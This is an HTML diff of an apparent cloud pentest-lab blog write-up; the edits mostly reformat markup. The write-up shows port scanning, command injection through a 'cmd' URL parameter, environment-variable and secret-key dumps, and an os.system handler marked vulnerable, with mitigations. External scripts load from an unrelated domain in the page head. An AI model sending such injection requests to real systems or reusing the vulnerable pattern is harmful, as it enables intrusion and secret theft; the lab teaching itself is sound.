@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -92,48 +92,48 @@
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="methodology">Methodology<a href="#methodology" class="hash-link" aria-label="Direct link to Methodology" title="Direct link to Methodology" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="port-scanning">Port Scanning<a href="#port-scanning" class="hash-link" aria-label="Direct link to Port Scanning" title="Direct link to Port Scanning" translate="no">​</a></h3>
 <p>We began with a comprehensive port scan to identify open services:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">34.45</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">163.97</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">nmap -sV 34.45.163.97</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p>**Port 22:**SSH (OpenSSH 8.4p1) — Indicates potential remote access capability</p>
+<p><strong>Port 22:</strong> SSH (OpenSSH 8.4p1) — Indicates potential remote access capability</p>
 </li>
 <li class="">
-<p>**Port 80:**HTTP (nginx 1.18.0) — Web server hosting applications</p>
+<p><strong>Port 80:</strong> HTTP (nginx 1.18.0) — Web server hosting applications</p>
 </li>
 <li class="">
-<p>**Port 443:**Closed — No HTTPS service</p>
+<p><strong>Port 443:</strong> Closed — No HTTPS service</p>
 </li>
 </ul>
 <img src="https://cdn-images-1.medium.com/max/800/1*d3SIeQXYI-5WtxJsw3BjaA.png" alt="Article image" width="819" height="357" loading="lazy" decoding="async">
-<p>**Analysis:**The presence of SSH on port 22 suggests we might be able to gain shell access if credentials are discovered. The nginx web server on port 80 is our primary target for web application vulnerabilities.</p>
+<p><strong>Analysis:</strong> The presence of SSH on port 22 suggests we might be able to gain shell access if credentials are discovered. The nginx web server on port 80 is our primary target for web application vulnerabilities.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="web-server-enumeration">Web Server Enumeration<a href="#web-server-enumeration" class="hash-link" aria-label="Direct link to Web Server Enumeration" title="Direct link to Web Server Enumeration" translate="no">​</a></h3>
 <p>Next, we examined the web server’s default response:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">//34.45.163.97/</span><br></div></code></pre></div></div>
-<p>**Results:**The server returned a default nginx welcome page, indicating a standard installation without obvious customizations. This suggests the actual application might be on a different path or subdomain.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl http://34.45.163.97/</span><br></div></code></pre></div></div>
+<p><strong>Results:</strong> The server returned a default nginx welcome page, indicating a standard installation without obvious customizations. This suggests the actual application might be on a different path or subdomain.</p>
 <img src="https://cdn-images-1.medium.com/max/800/1*IjXLyriKAryzt4FZnuTaSg.png" alt="Article image" width="828" height="600" loading="lazy" decoding="async">
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="cloud-service-discovery">Cloud Service Discovery<a href="#cloud-service-discovery" class="hash-link" aria-label="Direct link to Cloud Service Discovery" title="Direct link to Cloud Service Discovery" translate="no">​</a></h3>
 <p>From the Terraform deployment outputs, we identified additional attack surfaces:</p>
 <ul>
 <li class="">
-<p><strong>Cloud Function URL:</strong><code>[https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2](https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2)</code></p>
+<p><strong>Cloud Function URL:</strong> <code>[https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2](https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2)</code></p>
 </li>
 <li class="">
-<p><strong>Cloud Run URL:</strong><code>[https://vulnerable-api-97d005e2-j6vccqiqtq-uc.a.run.app](https://vulnerable-api-97d005e2-j6vccqiqtq-uc.a.run.app)</code></p>
+<p><strong>Cloud Run URL:</strong> <code>[https://vulnerable-api-97d005e2-j6vccqiqtq-uc.a.run.app](https://vulnerable-api-97d005e2-j6vccqiqtq-uc.a.run.app)</code></p>
 </li>
 </ul>
-<p>**Key Insight:**Cloud Functions and Cloud Run services often have different security configurations than traditional web servers. They may expose APIs, handle authentication differently, or contain serverless-specific vulnerabilities.</p>
+<p><strong>Key Insight:</strong> Cloud Functions and Cloud Run services often have different security configurations than traditional web servers. They may expose APIs, handle authentication differently, or contain serverless-specific vulnerabilities.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-matters">Why This Matters<a href="#why-this-matters" class="hash-link" aria-label="Direct link to Why This Matters" title="Direct link to Why This Matters" translate="no">​</a></h3>
 <p>Reconnaissance is critical because:</p>
 <ul>
 <li class="">
-<p>**Attack Surface Identification:**Each discovered service represents a potential entry point</p>
+<p><strong>Attack Surface Identification:</strong> Each discovered service represents a potential entry point</p>
 </li>
 <li class="">
-<p>**Technology Stack Analysis:**Understanding the technologies helps identify known vulnerabilities</p>
+<p><strong>Technology Stack Analysis:</strong> Understanding the technologies helps identify known vulnerabilities</p>
 </li>
 <li class="">
-<p>**Architecture Mapping:**Knowing the infrastructure layout helps plan lateral movement</p>
+<p><strong>Architecture Mapping:</strong> Knowing the infrastructure layout helps plan lateral movement</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-cloud-function-command-injection">2. Cloud Function Command Injection<a href="#2-cloud-function-command-injection" class="hash-link" aria-label="Direct link to 2. Cloud Function Command Injection" title="Direct link to 2. Cloud Function Command Injection" translate="no">​</a></h2>
@@ -143,44 +143,44 @@
 <p>The Cloud Function URL suggested it might be intentionally vulnerable. We tested for command injection by examining the function’s behavior with different parameters.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploitation">Exploitation<a href="#exploitation" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation" translate="no">​</a></h3>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="initial-test">Initial Test<a href="#initial-test" class="hash-link" aria-label="Direct link to Initial Test" title="Direct link to Initial Test" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=id&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=id&quot;</span><br></div></code></pre></div></div>
 <p><strong>Result:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">uid=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">) gid=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">) groups=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">33</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">(www-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">data</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div></code></pre></div></div>
-<p>**Analysis:**The function executed the<code>id</code>command and returned the output, confirming command injection. The process is running as<code>www-data</code>, a common web server user with limited privileges but sufficient access to explore the environment.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></div></code></pre></div></div>
+<p><strong>Analysis:</strong> The function executed the <code>id</code> command and returned the output, confirming command injection. The process is running as <code>www-data</code>, a common web server user with limited privileges but sufficient access to explore the environment.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="system-information-gathering">System Information Gathering<a href="#system-information-gathering" class="hash-link" aria-label="Direct link to System Information Gathering" title="Direct link to System Information Gathering" translate="no">​</a></h3>
 <p>We expanded our testing to gather more information:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=whoami&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=uname -a&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=ls -la /&quot;</span><br></div></code></pre></div></div>
-<p>**Why This Works:**The Cloud Function code likely contains something like:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">import</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> os</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">import</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> urllib.parse</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=whoami&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=uname -a&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?cmd=ls -la /&quot;</span><br></div></code></pre></div></div>
+<p><strong>Why This Works:</strong> The Cloud Function code likely contains something like:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">import os</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">import urllib.parse</span><br></div></code></pre></div></div>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">def vulnerable_handler(request):</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    cmd = request.args.get(&#x27;cmd&#x27;)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    if cmd:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">        os.system(cmd)  # VULNERABLE: Direct command execution</span><br></div></code></pre></div></div>
 <p>The function directly executes user input without validation, encoding, or sanitization.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="impact">Impact<a href="#impact" class="hash-link" aria-label="Direct link to Impact" title="Direct link to Impact" translate="no">​</a></h3>
 <p>Command injection provides:</p>
 <ul>
 <li class="">
-<p>**Remote Code Execution:**Ability to execute arbitrary commands on the Cloud Function runtime</p>
+<p><strong>Remote Code Execution:</strong> Ability to execute arbitrary commands on the Cloud Function runtime</p>
 </li>
 <li class="">
-<p>**Environment Access:**Can read files, list directories, and access environment variables</p>
+<p><strong>Environment Access:</strong> Can read files, list directories, and access environment variables</p>
 </li>
 <li class="">
-<p>**Lateral Movement:**Can be used to explore the internal network and access other services</p>
+<p><strong>Lateral Movement:</strong> Can be used to explore the internal network and access other services</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation">Mitigation<a href="#mitigation" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <p>To prevent command injection:</p>
 <ul>
 <li class="">
-<p>**Input Validation:**Validate and sanitize all user inputs</p>
+<p><strong>Input Validation:</strong> Validate and sanitize all user inputs</p>
 </li>
 <li class="">
-<p>**Parameterized Commands:**Use subprocess with parameterized arguments instead of shell execution</p>
+<p><strong>Parameterized Commands:</strong> Use subprocess with parameterized arguments instead of shell execution</p>
 </li>
 <li class="">
-<p>**Principle of Least Privilege:**Run functions with minimal required permissions</p>
+<p><strong>Principle of Least Privilege:</strong> Run functions with minimal required permissions</p>
 </li>
 <li class="">
-<p>**Input Whitelisting:**Only allow specific, expected commands if command execution is necessary</p>
+<p><strong>Input Whitelisting:</strong> Only allow specific, expected commands if command execution is necessary</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-environment-variable-exposure">3. Environment Variable Exposure<a href="#3-environment-variable-exposure" class="hash-link" aria-label="Direct link to 3. Environment Variable Exposure" title="Direct link to 3. Environment Variable Exposure" translate="no">​</a></h2>
@@ -188,11 +188,11 @@
 <p>Cloud Functions often store sensitive configuration in environment variables, including API keys, database credentials, and service account information. Exposing these variables can lead to credential compromise.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="discovery">Discovery<a href="#discovery" class="hash-link" aria-label="Direct link to Discovery" title="Direct link to Discovery" translate="no">​</a></h3>
 <p>While exploring the Cloud Function, we discovered an endpoint that exposed environment variables:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?env=1&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> | jq .</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?env=1&quot; | jq .</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="results">Results<a href="#results" class="hash-link" aria-label="Direct link to Results" title="Direct link to Results" translate="no">​</a></h2>
 <p>The endpoint returned a complete JSON object containing all environment variables:</p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;SECRET_KEY&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;exposed-secret-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;FUNCTION_TARGET&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;vulnerable_handler&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;K_SERVICE&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;vulnerable-function-97d005e2&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;GAE_RUNTIME&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;python39&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;PORT&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;8080&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;HOME&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">: </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;/root&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
-<p>**Critical Finding:**The<code>SECRET_KEY</code>was exposed, which could be used for:</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">{</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;SECRET_KEY&quot;: &quot;exposed-secret-97d005e2&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;FUNCTION_TARGET&quot;: &quot;vulnerable_handler&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;K_SERVICE&quot;: &quot;vulnerable-function-97d005e2&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;GAE_RUNTIME&quot;: &quot;python39&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;PORT&quot;: &quot;8080&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  &quot;HOME&quot;: &quot;/root&quot;,</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  ...</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">}</span><br></div></code></pre></div></div>
+<p><strong>Critical Finding:</strong> The <code>SECRET_KEY</code> was exposed, which could be used for:</p>
 <ul>
 <li class="">
 <p>Session hijacking</p>
@@ -211,48 +211,48 @@
 <p>Environment variable exposure typically occurs when:</p>
 <ul>
 <li class="">
-<p>**Debug Endpoints:**Development/debug endpoints are left enabled in production</p>
+<p><strong>Debug Endpoints:</strong> Development/debug endpoints are left enabled in production</p>
 </li>
 <li class="">
-<p>**Error Handling:**Error messages accidentally include environment data</p>
+<p><strong>Error Handling:</strong> Error messages accidentally include environment data</p>
 </li>
 <li class="">
-<p>**Intentional Exposure:**Developers create endpoints to view configuration for troubleshooting</p>
+<p><strong>Intentional Exposure:</strong> Developers create endpoints to view configuration for troubleshooting</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="impact-1">Impact<a href="#impact-1" class="hash-link" aria-label="Direct link to Impact" title="Direct link to Impact" translate="no">​</a></h3>
 <p>Exposed environment variables can lead to:</p>
 <ul>
 <li class="">
-<p>**Credential Theft:**API keys, passwords, and tokens can be extracted</p>
+<p><strong>Credential Theft:</strong> API keys, passwords, and tokens can be extracted</p>
 </li>
 <li class="">
-<p>**Configuration Disclosure:**Understanding the system architecture and dependencies</p>
+<p><strong>Configuration Disclosure:</strong> Understanding the system architecture and dependencies</p>
 </li>
 <li class="">
-<p>**Further Exploitation:**Credentials can be used to access other services</p>
+<p><strong>Further Exploitation:</strong> Credentials can be used to access other services</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-1">Mitigation<a href="#mitigation-1" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Remove Debug Endpoints:**Never expose environment variables in production</p>
+<p><strong>Remove Debug Endpoints:</strong> Never expose environment variables in production</p>
 </li>
 <li class="">
-<p>**Use Secret Manager:**Store sensitive values in GCP Secret Manager instead of environment variables</p>
+<p><strong>Use Secret Manager:</strong> Store sensitive values in GCP Secret Manager instead of environment variables</p>
 </li>
 <li class="">
-<p>**Access Control:**Implement authentication for any configuration viewing endpoints</p>
+<p><strong>Access Control:</strong> Implement authentication for any configuration viewing endpoints</p>
 </li>
 <li class="">
-<p>**Audit Logging:**Monitor access to sensitive endpoints</p>
+<p><strong>Audit Logging:</strong> Monitor access to sensitive endpoints</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-secret-key-extraction">4. Secret Key Extraction<a href="#4-secret-key-extraction" class="hash-link" aria-label="Direct link to 4. Secret Key Extraction" title="Direct link to 4. Secret Key Extraction" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="objective-3">Objective<a href="#objective-3" class="hash-link" aria-label="Direct link to Objective" title="Direct link to Objective" translate="no">​</a></h3>
 <p>Building on the environment variable exposure, we discovered a direct endpoint that returned the secret key without requiring additional parsing.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="exploitation-1">Exploitation<a href="#exploitation-1" class="hash-link" aria-label="Direct link to Exploitation" title="Direct link to Exploitation" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?secret=1&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">curl &quot;https://us-central1-cloud-pentest-lab-1769707855.cloudfunctions.net/vulnerable-function-97d005e2/?secret=1&quot;</span><br></div></code></pre></div></div>
 <p><strong>Result:</strong></p>
 <div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">exposed-secret-97d005e2</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="analysis">Analysis<a href="#analysis" class="hash-link" aria-label="Direct link to Analysis" title="Direct link to Analysis" translate="no">​</a></h3>
@@ -260,56 +260,56 @@
 <p><strong>Use Cases for Secret Key:</strong></p>
 <ul>
 <li class="">
-<p>**Session Management:**Many frameworks use secret keys to sign session cookies</p>
+<p><strong>Session Management:</strong> Many frameworks use secret keys to sign session cookies</p>
 </li>
 <li class="">
-<p>**Token Generation:**JWT tokens and API keys may be signed with the secret</p>
+<p><strong>Token Generation:</strong> JWT tokens and API keys may be signed with the secret</p>
 </li>
 <li class="">
-<p>**Data Encryption:**Application data might be encrypted using this key</p>
+<p><strong>Data Encryption:</strong> Application data might be encrypted using this key</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-is-dangerous">Why This is Dangerous<a href="#why-this-is-dangerous" class="hash-link" aria-label="Direct link to Why This is Dangerous" title="Direct link to Why This is Dangerous" translate="no">​</a></h3>
 <p>A compromised secret key can lead to:</p>
 <ul>
 <li class="">
-<p>**Session Forgery:**Attackers can create valid session tokens</p>
+<p><strong>Session Forgery:</strong> Attackers can create valid session tokens</p>
 </li>
 <li class="">
-<p>**Authentication Bypass:**Bypass authentication mechanisms</p>
+<p><strong>Authentication Bypass:</strong> Bypass authentication mechanisms</p>
 </li>
 <li class="">
-<p>**Data Tampering:**Modify encrypted data without detection</p>
+<p><strong>Data Tampering:</strong> Modify encrypted data without detection</p>
 </li>
 </ul>
